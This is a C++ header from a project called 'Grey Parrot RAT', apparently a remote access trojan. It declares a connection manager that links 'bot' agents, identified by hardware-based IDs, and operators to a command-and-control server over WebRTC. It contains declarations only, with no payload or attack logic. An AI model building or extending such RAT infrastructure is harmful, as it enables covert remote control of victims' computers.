//
// Created by alsah on 16.03.23.
//

#ifndef GREY_PARROT_RAT_CORE_CONNECTIONS_MANAGER_H
#define GREY_PARROT_RAT_CORE_CONNECTIONS_MANAGER_H

#include "rtc/rtc.hpp"
#include <memory>
#include <utility>

#include "C2ServerChannel.h"
#include "IControlPacketHandler.h"
#include "IControlPacketSender.h"


struct ConnectionConfig {

    // OperatorPanel case - runtime uuid; agent - hardware-based uuid
    const std::string connectionId;

    // Cant be changed; agent must use "bot", operator - "operator"
    const std::string endpoint;

    // address and port of c2-server; potentially can be changed
    std::string c2server;

    ConnectionConfig(std::string connectionId, std::string endpoint);

    [[nodiscard]] std::string getUrl() const;
};


class ConnectionsManager : public IControlPacketSender{


public:

    explicit ConnectionsManager(ConnectionConfig config);
    ~ConnectionsManager();

    void setTasksHandler(std::shared_ptr<IControlPacketHandler> tasksRegister);

    ConnectionsManager(ConnectionsManager&) = delete;
    ConnectionsManager(const ConnectionsManager&) = delete;
    void operator = (const ConnectionsManager&) = delete;
    void operator = (ConnectionsManager) = delete;

    void send(const msgs::ControlPacket&  data) override;

    void start(const std::string& c2sever);
    void stop();


private:

    ConnectionConfig config;

    std::shared_ptr<IControlPacketHandler> packetsHandler;

    std::unique_ptr<C2ServerChannel> c2ServerChannel;

    void handleC2ServerMessage(std::vector<std::byte>& data);

};




#endif //GREY_PARROT_RAT_CORE_CONNECTIONS_MANAGER_H
